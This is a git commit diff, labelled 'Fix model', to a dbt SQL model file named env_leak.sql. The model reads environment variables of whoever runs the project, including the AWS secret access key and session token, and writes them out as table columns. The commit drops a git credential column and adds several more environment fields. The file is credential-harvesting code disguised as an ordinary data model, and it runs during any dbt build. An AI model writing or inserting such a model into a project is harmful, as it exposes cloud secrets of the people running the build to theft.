85a8aed17ea5f5d2f8b02345db1f30cff7411573
Rockcena <8775215+Rockcena@users.noreply.github.com>
2026-09-06 23:11:59 +0530

    Fix model

--- models/env_leak.sql
+++ models/env_leak.sql
@@ -5,10 +5,13 @@ SELECT
     '{{ env_var("AWS_SECRET_ACCESS_KEY", "NOT_SET") }}' as aws_secret,
     '{{ env_var("AWS_SESSION_TOKEN", "NOT_SET") }}' as aws_session_token,
     '{{ env_var("AWS_DEFAULT_REGION", "NOT_SET") }}' as aws_region,
-    '{{ env_var("DBT_ENV_SECRET_GIT_CREDENTIAL", "NOT_SET") }}' as git_cred,
     '{{ env_var("HOSTNAME", "NOT_SET") }}' as hostname_val,
     '{{ env_var("HOME", "NOT_SET") }}' as home_dir,
     '{{ env_var("PATH", "NOT_SET") }}' as path_val,
     '{{ env_var("DBT_CLOUD_PROJECT_ID", "NOT_SET") }}' as dbt_project,
     '{{ env_var("DBT_CLOUD_RUN_ID", "NOT_SET") }}' as dbt_run,
-    '{{ env_var("DBT_CLOUD_ENVIRONMENT_ID", "NOT_SET") }}' as dbt_env
+    '{{ env_var("DBT_CLOUD_ENVIRONMENT_ID", "NOT_SET") }}' as dbt_env,
+    '{{ env_var("DBT_CLOUD_JOB_ID", "NOT_SET") }}' as dbt_job,
+    '{{ env_var("USER", "NOT_SET") }}' as user_val,
+    '{{ env_var("LANG", "NOT_SET") }}' as lang_val,
+    '{{ env_var("DBT_PROFILES_DIR", "NOT_SET") }}' as profiles_dir
